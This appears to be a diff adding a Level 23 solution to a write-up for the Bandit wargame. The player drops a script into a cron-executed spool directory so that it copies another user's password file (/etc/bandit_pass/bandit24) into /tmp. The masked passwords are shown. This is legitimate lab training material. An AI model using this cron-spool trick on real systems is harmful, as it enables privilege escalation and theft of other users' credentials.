@@ -240,3 +240,42 @@ bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1
 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8xxxxxxxxxx
 ```
+
+#### Level 23
+
+```s
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$ mkdir /tmp/avikki24
+bandit23@bandit:~$ cd /tmp/avikki24
+bandit23@bandit:/tmp/avikki24$ nano myscript.sh
+bandit23@bandit:/tmp/avikki24$ chmod +x myscript.sh 
+bandit23@bandit:/tmp/avikki24$ cp myscript.sh  /var/spool/bandit24/
+bandit23@bandit:/tmp/avikki24$ ls -al /var/spool/bandit24/myscript.sh
+-rwxr-xr-x 1 bandit23 bandit23 61 Mar 21 13:34 /var/spool/bandit24/myscript.sh
+bandit23@bandit:/tmp/avikki24$ cat /tmp/bandit24_pass
+UoMYTrfrBFHyQXxxxxxxxxxxxxxxxx
+```
+
+inside myscript.sh
+```s
+#!/bin/bash
+
+cp /etc/bandit_pass/bandit24 /tmp/bandit24_pass
+```
+
